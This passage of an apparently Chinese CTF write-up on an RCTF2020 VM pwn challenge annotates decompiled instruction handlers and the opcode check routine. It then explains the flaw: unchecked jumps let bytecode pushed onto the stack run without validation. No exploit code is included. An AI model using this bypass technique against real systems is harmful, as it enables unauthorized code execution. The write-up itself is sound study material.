    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v25 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将两个寄存器中的值相加，放入v27指定的寄存器中</span>
    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC指针后移</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//sub功能标志位为1，通过第二字节是否为1，可以指定寄存器中的值与code中的数值相加，或者两个寄存器中的值进行相减</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></code></pre>
<p>就分析这几个指令吧，其他的和这几个的结构都差不多的，以第一字节作为标志位，标志执行什么功能，第二字节作为是寄存器之间进行操作还是寄存器与数值进行操作的标志位，第三字节指定第一个寄存器，当第二字节为1时，第四部分为一个八字节的数字，否则为一个一字节的数值，指定第二个寄存器。总结所有code如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"add"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"mul"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"div"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"mov"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"jsr"</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"and"</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">"xor"</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"or"</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"not"</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">"push"</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">"pop"</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">"jmp"</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">"alloc"</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">"nop"</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">}</span></code></pre>
<p>现在我们再回过头来看check函数，check函数接收一个参数，为vm结构体。check函数短一些，所以全部分析一遍吧</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">check</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// al</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+19h] [rbp-27h]</span>
  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Dh] [rbp-23h]</span>
  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Eh] [rbp-22h]</span>
  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>
  <span class="token keyword">unsigned</span> __int8 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+21h] [rbp-1Fh]</span>
  <span class="token keyword">unsigned</span> __int8 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+22h] [rbp-1Eh]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-1Ch]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-14h]</span>
  <span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span>v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>

  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC</span>
  v11 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token operator">++</span>v10<span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取标志位</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//标志位为9，对应not</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二个字节的值大于7，寄存器范围报错，因此只有八个寄存器</span>
        <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/*not
    else if ( v2 == 9 )
    {
      v9 = take_value(v30 + 1);
      *(_QWORD *)(8LL * v9 + a1) = ~*(_QWORD *)(8LL * v9 + a1);
      v30 += 2;
    }not只有两个字节，将通过第二个字节找到的寄存器的值取反
    */</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">0xC</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位为12，对应jmp</span>
      <span class="token punctuation">{</span>
        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无操作，PC指针后移两个字节</span>
      <span class="token punctuation">}</span>
      <span class="token comment" spellcheck="true">/*jmp
      else if ( v2 > 11 )
      {
          ..........
          else if ( v2 &lt; 13 )
        {
          v30 += (unsigned __int8)take_value(v30 + 1) + 2;//PC指针往后移动take_value(v30 + 1) + 2
        }
      }
      */</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0xC</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">0xE</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位为14，对应nop</span>
        <span class="token punctuation">{</span>
          <span class="token operator">++</span>v13<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无操作，PC指针后移两个字节</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0xE</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位13，对应alloc</span>
        <span class="token punctuation">{</span>
          v12 <span class="token operator">=</span> <span class="token function">sub_D13</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第二字节</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">&lt;=</span> <span class="token number">0xFF</span> <span class="token operator">||</span> v12 <span class="token operator">></span> <span class="token number">0x1000</span> <span class="token punctuation">)</span>
            <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid size!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//限制重新分配的栈空间大小</span>
          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x5C</span><span class="token punctuation">)</span> <span class="token operator">=</span> v12 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span>
          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true">/*alloc
        if ( v2 == 13 )
        {
          v29 = sub_D13((unsigned int *)(v30 + 1));//取第二字节
          free((void *)(*(_QWORD *)(a1 + 0x48) - 8LL * *(unsigned int *)(a1 + 0x5C)));//将原来的栈空间free掉
          (//vm结构体
          *(_QWORD *)(a1 + 0x40) = malloc(a2);
            *(_QWORD *)(a1 + 0x48) = *(_QWORD *)(a1 + 0x40) + 8LL * (a2 >> 3);
            *(_QWORD *)(a1 + 0x40) = *(_QWORD *)(a1 + 0x48);
            *(_DWORD *)(a1 + 0x5C) = a2 >> 3;
            )
          set_stack(a1, v29);//重新设定大小为v29的栈空间
          v30 += 5;//PC指针后移
        }
        */</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">255</span> <span class="token punctuation">)</span>
LABEL_67<span class="token punctuation">:</span>
            <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">0xA</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位为10，对应push</span>
      <span class="token punctuation">{</span>
        v4 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第二字节</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二字节不为1且不为0</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">92</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果栈数值大于最大数据量</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二字节为1</span>
        <span class="token punctuation">{</span>
          v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移</span>
        <span class="token punctuation">}</span>
      <span class="token comment" spellcheck="true">/*push
      else if ( v2 > 9 )
      {
        if ( (unsigned __int8)take_value(v30 + 1) == 1 ) //如果第二字节为1
        {
          v31 = take_value_QWORD((__int64)(v30 + 2)); //取第三部分，一个八字节数
          *(_QWORD *)(a1 + 0x40) -= 8LL;//栈顶降低八字节
          **(_QWORD **)(a1 + 0x40) = v31;//将这个八字节数压入栈中
          v30 += 10;//PC指针后移，1+1+8=10
        }
        else//如果第二字节不为1
        {
          v8 = take_value(v30 + 2);取第三字节
          *(_QWORD *)(a1 + 0x40) -= 8LL;栈顶降低八字节
          **(_QWORD **)(a1 + 0x40) = *(_QWORD *)(a1 + 8LL * v8);//将通过v8指定的寄存器的值压入栈中
          v30 += 3;
        }
        ++*(_DWORD *)(a1 + 58);//栈的数据数量加一
      }
      */</span>
        <span class="token keyword">else</span><span class="token comment" spellcheck="true">//如果第二字节不为1</span>
        <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第三字节大于7</span>
            <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span><span class="token comment" spellcheck="true">//如果标志位为11，对应pop</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果栈为空</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移</span>
        <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//栈数据减一</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果标志位为4，对应mov</span>
    <span class="token punctuation">{</span>
      v2 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第二字节</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">||</span> v2 <span class="token operator">&amp;</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1或4</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果寄存器超范围</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span><span class="token comment" spellcheck="true">//如果第二字节不为1或4</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二字节也不为8或0x10或0x20</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v5 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第三字节</span>
        v6 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第四字节</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">7u</span> <span class="token operator">||</span> v6 <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果寄存器超范围</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/*mov
      else
      {
        v3 = take_value(v30 + 1);//取第二个字节
        if ( v3 &amp; 1 ) //第二字节为1
        {
          v4 = (__int64 *)(8LL * (unsigned __int8)take_value(v30 + 2) + a1);取第三字节指定的寄存器的值
          *v4 = take_value_QWORD((__int64)(v30 + 3));//将寄存器中的值指向的地址赋值为一个八字节数
          v30 += 11;//PC指针后移
        }
        else if ( v3 &amp; 4 )//第二字节为4
        {
          v20 = take_value(v30 + 2);//取第三字节
          v33 = take_value_QWORD((__int64)(v30 + 3));//取八字节数
          *(_QWORD *)(8LL * v20 + a1) = take_value_QWORD(v33);//将一个寄存器赋值为这个数
          v30 += 11;
        }
        else if ( v3 &amp; 8 )//第二字节为8
        {
          v19 = take_value(v30 + 2);//取第三字节
          *(_QWORD *)(8LL * v19 + a1) = *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//将一个寄存器中的值赋给另一个寄存器
          v30 += 4;
        }
        else if ( v3 &amp; 0x10 )//第二字节为0x10
        {
          v17 = take_value(v30 + 2);//取第三字节
          v18 = take_value(v30 + 3);//取第四字节
          v32 = take_value_QWORD(*(_QWORD *)(8LL * v18 + a1));//取v18指定的寄存器的值
          *(_QWORD *)(8LL * v17 + a1) = take_value_QWORD(v32);//将v32指向的地址中的值赋给v17指定的寄存器
          v30 += 4;
        }
        else
        {
          if ( !(v3 &amp; 0x20) )//第二字节为0x20
            sub_CAA("Invalid code!");
          v16 = take_value(v30 + 2);取第三字节
          **(_QWORD **)(8LL * v16 + a1) = *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//将第三字节指向的寄存器中的值赋给v16指定的寄存器的值指向的地址
          v30 += 4;
        }
      }
    */</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//剩下的就不说了</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">5</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_18<span class="token punctuation">;</span>
      v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_67<span class="token punctuation">;</span>
LABEL_18<span class="token punctuation">:</span>
      v7 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v8 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v9 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">></span> <span class="token number">7u</span> <span class="token operator">||</span> v9 <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span>
          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x5C</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v10<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>vm结构体如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>
    uint64_t r0<span class="token punctuation">;</span>
    uint64_t r1<span class="token punctuation">;</span>
    uint64_t r2<span class="token punctuation">;</span>
    uint64_t r3<span class="token punctuation">;</span>
    uint64_t r4<span class="token punctuation">;</span>
    uint64_t r5<span class="token punctuation">;</span>
    uint64_t r6<span class="token punctuation">;</span>
    uint64_t r7<span class="token punctuation">;</span>
    uint64_t<span class="token operator">*</span> rsp<span class="token punctuation">;</span>
    uint64_t<span class="token operator">*</span> rbp<span class="token punctuation">;</span>
    uint8_t<span class="token operator">*</span> pc<span class="token punctuation">;</span>
    uint32_t stack_size<span class="token punctuation">;</span>
    uint32_t stack_cap<span class="token punctuation">;</span>
<span class="token punctuation">}</span>vm<span class="token punctuation">;</span></code></pre>
<p>分析完check，我们知道寄存器的范围被限定了，不允许我们越界读写，但其中的jmp功能并没有做任何check，而且在vm_start函数中，先分配的pc段，再分配的stack段，stack段在高地址，两个段分别是两个chunk，chunk之间因为presize的存在会有一段空字符，因此这个check函数其实只检查了PC段，stack段是没有做任何检查的。因此我们可以将先将code压入栈中，然后再跳到栈中执行，这样就没有check了。</p>
<p>暂且就分析这些，exp就看ruan师傅的吧，我这里将所有的函数和指令都分析一遍，这样无论是自己复现还是调试别人的exp也应该不会一脸懵逼了，调试起来会快一些。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>复现几题vmpwn之后感觉人都变佛系了许多，逆向指令十分考研耐心和细心，最好是一边分析一边做注释，慢一点也没关系，以免因代码量太大，分析完之后再回头看又不知道是什么了。</p>
<p>参考链接:</p>
<p><a href="https://www.anquanke.com/post/id/199832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199832</a></p>
<p><a href="https://ruan777.github.io/2020/06/01/RCTF2020部分题解_ch/" target="_blank" rel="noopener">https://ruan777.github.io/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
